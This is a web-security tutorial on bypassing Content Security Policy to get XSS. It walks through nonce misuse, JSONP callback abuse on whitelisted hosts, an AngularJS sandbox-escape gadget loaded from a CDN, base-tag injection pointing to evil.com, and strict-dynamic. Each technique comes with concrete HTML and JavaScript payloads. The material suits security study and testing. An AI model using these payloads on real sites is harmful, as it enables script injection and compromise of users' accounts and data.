# Breaking CSPs: Practical Content Security Policy Bypass Techniques

![Breaking CSPs header image](img/breaking-csps.png)

In the previous [article](https://github.com/Marduk-I-Am/web-security-notes/blob/main/xss/reading-csps-like-an-attacker.md) we learned how to read a Content Security Policy from an attacker's perspective. The next step is understanding how those policies fail in the real world.

Most CSP bypasses don't involve "breaking" CSP. Instead, they exploit trusted relationships, like reused nonces, trusted third-party domains, and dynamically loaded scripts, the policy already allows.

The goal isn't to memorize every bypass. It's to learn how to recognize the conditions that make each one possible.

##  Bypass 1: Nonce Misuse

Nonces are widely considered one of the strongest CSP defenses against XSS. When implemented correctly, they're extremely difficult to bypass because every page load receives a new, unpredictable value.

The nonce ("number used once") attribute is useful to allowlist specific elements, such as a particular inline script or style elements.

A nonce-based policy looks like this:
```text
Content-Security-Policy: script-src 'nonce-r4nd0m123'
```
```html
<script nonce="r4nd0m123">trustedCode()</script>
```

The browser only executes inline `<script>` elements whose nonce attribute matches the value in the policy. This is supposed to be airtight. And when implemented correctly, it largely is. The nonce is meant to be cryptographically random and regenerated on every page load, so you can't predict it.

### Inside a script block

The weakness usually isn't the nonce. It's where your input lands.

If your injection point lands inside an existing `<script nonce="...">` block, you don't need to know the nonce at all. You're injecting into an already-trusted script tag.

In the following `<script>`, **if** you control `INJECTION_POINT` **and** can break out of the string with `";alert(1);"`, does CSP block this?
```html
<script nonce="r4nd0m123">
  var username = "INJECTION_POINT";
  console.log(username);
</script>
```

**No**. The CSP will not block `";alert(1);"`

The nonce attribute is on the `<script>` tag itself, evaluated once when the browser parses the tag. Anything inside that tag, including your injected code, executes under that same nonce's authority. You never had to guess `r4nd0m123`. You rode along inside a script block the server already trusted.

### Static nonces

If the same nonce value appears on every page load (generating it once at server startup instead of per-request), you can simply observe the nonce from one response and use it in a completely separate injected `<script nonce="...">` tag elsewhere on the page, if you have any injection point outside existing script tags.
```html
<script nonce="n0tr4nd0m123">alert(1)</script>
```

During testing, always reload the page at least once and compare the nonce values. Is the nonce the same both times?
- **Yes** - nonce is static and allows you to create your own trusted `<script nonce="...">` elements anywhere HTML injection is possible.
- **No** - nonce is per-request and only the "inject inside existing script tag" path will apply.

##  Bypass 2: JSONP endpoints on whitelisted hosts

Say the returned CSP says:
```text
Content-Security-Policy: script-src 'self' https://accounts.google.com
```

This says only scripts that come from the page's own origin (`'self'`), or from `https://accounts.google.com` are allowed to execute. The browser enforces this based solely on the origin.

Finding public JSONP endpoints for any whitelisted sites **that reflect your input back as JavaScript**, effectively allows you to smuggle arbitrary code because the browser sees the script as coming from a trusted source.

So it's a two‑step recon.
- Identify the **whitelisted domains** from the target's CSP.
- Research those domains for any JSONP or other script‑injection surface.

As an attacker, you see the whitelist and think "*I know that `accounts.google.com` hosts a JSONP endpoint. Let me Google it, check public docs, or look at my cheat sheets*."

📓 **NOTE:** Any JSONP endpoint that naively reflects the `callback` parameter allows you to execute arbitrary JavaScript. In the past, Google’s `/o/oauth2/revoke` may have been used as a proof of concept, though modern validation will likely block it. Today, you’d look for other whitelisted domains with less strict endpoints. However, the attack pattern remains identical.

For demonstrative purposes I'll use:
```text
GET https://accounts.google.com/o/oauth2/revoke?callback=myFunction
```

The server's typical response will look something like:
```text
myFunction({"error": "invalid_token"})
```

Since `accounts.google.com` is whitelisted, you can attempt to load a `<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)//">` tag, the browser fetches it so CSP permits it.
- `alert(1)` executes as a function call.
- The `//` at the end comments out anything that would otherwise break the syntax

The response becomes:
```text
alert(1)({"error": "invalid_token"})
```

**What tips you off**: any whitelisted host that's a major platform (Google, Facebook, Twitter/X APIs, analytics platforms) is worth a quick search for "`<hostname>` jsonp" or checking their API docs for callback parameters. This is exactly the kind of thing the CSP bypass cheat sheets catalog:
- [JSONBee](https://github.com/zigoo0/JSONBee)
- [CSP Evaluator](https://csp-evaluator.withgoogle.com/)

Check those first before manually hunting.

##  Bypass 3: Trusted third-party JavaScript gadget abuse

Similar to JSONP endpoints, trusted third-party JavaScript gadget abuse relies on a whitelisted host (like a CDN).
```text
Content-Security-Policy: script-src 'self' https://cdnjs.cloudflare.com
```

The core idea:  
- A whitelisted host serves a legitimate JavaScript library.
- That library has a feature (a "gadget") that can be abused to execute arbitrary code if you control some input to it.
- You use a `<script>` tag to load the library from the whitelisted origin, and then either pass payload via parameters or rely on page-level global pollution.

If `cdnjs.cloudflare.com` is whitelisted, you could load an old AngularJS (now fixed) version and use its expression sandbox bypass:
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app ng-csp>
  {{constructor.constructor('alert(1)')()}}
</div>
```

CSP allows the script (origin is whitelisted), and Angular's template engine executes the payload.

Today, you'd look for similar gadgets in other libraries like Prototype.js, jQuery (very old versions), Handlebars, etc. You can also abuse JSONP endpoints (Bypass 2), which is a subset of this concept.

How to find these in practice:
- Use the CSP Evaluator or CSP Bypass Cheat Sheets to see if a whitelisted domain has known gadget exploits.
- Manually check which scripts are actually loaded from the whitelisted host. If you see a library with a known bypass, you're in.

##  Bypass 4: `base-uri` Injection

Let's say a page loads a relative script:
```html
<script src="/app.js"></script>
```

Normally that will resolve to `https://target.com/app.js`. The same origin, permitted by `'self'`.

However, if the site's CSP is this:
```text
Content-Security-Policy: script-src 'self'
```

Notice `base-uri` is absent. **If** you can inject any HTML into the page, this injection:
```html
<base href="https://evil.com/">
```

changes how the browser resolves *every* relative URL on the page from that point forward. Even if you can't inject a new `<script>` tag.

After your injected `<base>` tag, it resolves to `https://evil.com/app.js` instead. The script tag's `src` attribute didn't change. The resolution of that relative path changed.

📓 **NOTE:** this only works if the page actually uses relative script paths somewhere **after** your injection point. If every script tag uses a full absolute URL, `base-uri` injection does nothing. Check the page source for `src="/...""` patterns before relying on this.

This directive is frequently omitted because it receives much less attention than `script-src`, making it something worth checking on every target.

##  Bypass 5: Strict-dynamic and its Narrow Exception

You'll occasionally see:
```text
Content-Security-Policy: script-src 'nonce-abc123' 'strict-dynamic'
```

`'strict-dynamic'` means that any script loaded by a nonce-trusted script can itself load further scripts, without those further scripts needing a nonce. This exists so frameworks that dynamically inject scripts (common in modern bundlers) don't break.

What does this mean for you? If you can get *any* execution inside a nonce-trusted script context, say through a gadget that calls `document.createElement('script')` and appends it, that dynamically created script inherits trust under `'strict-dynamic'`.

This is a more advanced scenario and usually requires combining with a gadget, but it's worth recognizing the keyword when you see it.

##  Common Pitfall: When `'unsafe-inline'` Doesn't Mean What You Think

Not really a "bypass" per se, but a subtlety worth knowing for reading policies correctly and quickly:
```text
Content-Security-Policy: script-src 'nonce-abc123' 'unsafe-inline'
```

You may look at this CSP and think: “*Ah! `'unsafe-inline'` is present, so I can inject a `<script>alert(1)</script>` and it will run*.”

In a modern browser you would be wrong, `'nonce-abc123'` would take precedence over `'unsafe-inline'`. This exists specifically so that older browsers, without nonce support, fall back to `'unsafe-inline'` (graceful degradation) while modern browsers enforce the nonce strictly.

Don't assume `'unsafe-inline'` means "any inline script works" just because you see the string in the policy. Check whether a nonce or hash is also present in the same directive. If so, `'unsafe-inline'` is dead weight for modern browsers and your bypass needs to go through the nonce path (Bypass 1), not direct inline injection.

From that perspective, understanding that `'unsafe-inline'` is ignored is a bypass of your own misperception, and it redirects you to the correct exploitation path.

##  Conclusion
A CSP should never be viewed as an impenetrable wall or dismissed as irrelevant. It's another layer of reconnaissance.

Every directive answers a question:

- What does the browser trust?
- Where does that trust come from?
- Can I influence it?

The strongest CSP bypasses rarely involve clever payloads. They come from understanding exactly what the policy trusts and then finding a way to abuse that trust.

As with any XSS testing methodology, don't memorize bypasses. Learn to recognize the conditions that make them possible.

---

*Marduk-I-Am*  
Web Security Notes  

GitHub:
https://github.com/Marduk-I-Am